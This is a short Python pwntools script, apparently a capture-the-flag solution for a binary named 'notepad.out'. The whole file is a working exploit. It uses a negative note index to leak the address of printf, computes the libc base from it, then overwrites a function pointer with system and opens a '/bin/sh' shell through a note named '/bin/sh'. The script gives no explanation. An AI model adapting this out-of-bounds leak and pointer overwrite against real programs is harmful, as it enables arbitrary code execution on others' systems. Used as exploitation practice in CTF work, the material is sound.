from pwn import *

p = process("./notepad.out", env={'LD_PRELOAD': './libc.so.6'})
e = ELF("./notepad.out")
libc = ELF("./libc.so.6")

def view_note(idx):
    p.sendlineafter(">", "2")
    p.sendlineafter("Index: ", str(idx))
    
def create_note(idx, name, content):
    p.sendlineafter(">", "1")
    p.sendlineafter("Index: ", str(idx))
    p.sendafter("Name: ", name)
    p.sendafter("Content: ", content)

view_note(-4)
p.recvuntil('Name: ')
name = p.recvline(keepends=False)
printf = u64(name.ljust(8, b'\0'))
info(f"printf = {hex(printf)}")
libc.address = printf - libc.symbols['printf']
success(f"libc = {hex(libc.address)}")

system = libc.symbols['system']

create_note(-5, p64(0)*2, p64(0) + p64(0) + p64(system) + p64(0))
create_note(0, "/bin/sh", "<bleh>")

view_note(0)

p.interactive()